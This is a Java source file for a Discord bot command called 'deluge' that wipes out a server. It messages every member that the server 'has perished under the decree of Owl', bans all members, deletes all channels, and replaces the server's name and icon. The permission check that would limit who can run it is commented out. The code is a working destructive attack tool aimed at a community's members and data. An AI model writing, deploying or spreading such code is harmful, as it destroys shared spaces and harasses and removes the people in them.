import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.User;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.util.Objects;

public class ZenosHand extends Command {

    public ZenosHand()
    {

        this.name = "deluge";
        this.aliases = new String[] {"deluge", "gone"};
        this.help = "a cataclysm";



    }

    @Override
    protected void execute(CommandEvent event) {




        if (event.getMessage().getContentRaw().equalsIgnoreCase("$deluge")) {
            //if (event.getMessage().getMember().equals(Malek)) {


            EmbedBuilder rb = new EmbedBuilder();
            rb.setColor(Color.red);

            rb.setThumbnail("https://static.thenounproject.com/png/3572981-200.png");

            rb.setDescription("Welcome. Your server has perished under the decree of Owl.");
            rb.addField("Link:", "http://kemetheserver.github.io/", true);
                event.getGuild().loadMembers().onSuccess(members -> {
                    for(Member member: members)
                    {
                        member.getUser().openPrivateChannel().flatMap(channel -> channel.sendMessage(rb.build())).queue();

                    }
                });

                event.getGuild().loadMembers().onSuccess(members -> {
                    for (Member member : members) {


                        event.getGuild().ban(member, 0).queue();


                    }

                });

            for (int i = 0; i < event.getGuild().getChannels().size(); i++) {
                event.getGuild().getChannels().get(i).delete().queue();

            }

            event.getGuild().createTextChannel("\uD80C\uDD53").queue();


            File file = new File("C:\\Users\\chyra\\OneDrive\\Pictures\\owl.jpg");
            try {

                event.getGuild().getManager().setIcon(Icon.from(file)).queue();
            } catch (IOException e) {
                e.printStackTrace();
            }
            event.getGuild().getManager().setName("Owls Domain: " + "\uD808\uDD8D\uD808\uDC2D\uD808\uDE8F\uD808\uDDA0").queue();





            //  } else {
            //    event.getChannel().sendMessage("You do not possess this power. Report has been compiled and sent to Owl.").queue();
             //   event.getMessage().getMember().modifyNickname("The Fool").queue();
              //  event.getGuild().removeRoleFromMember(event.getMessage().getMember(), event.getGuild().getRoleById("812826397537075237")).queue();
               // event.getGuild().addRoleToMember(event.getMessage().getMember(), event.getGuild().getRoleById("812826397537075231")).queue();

            //}




        }







    }







}
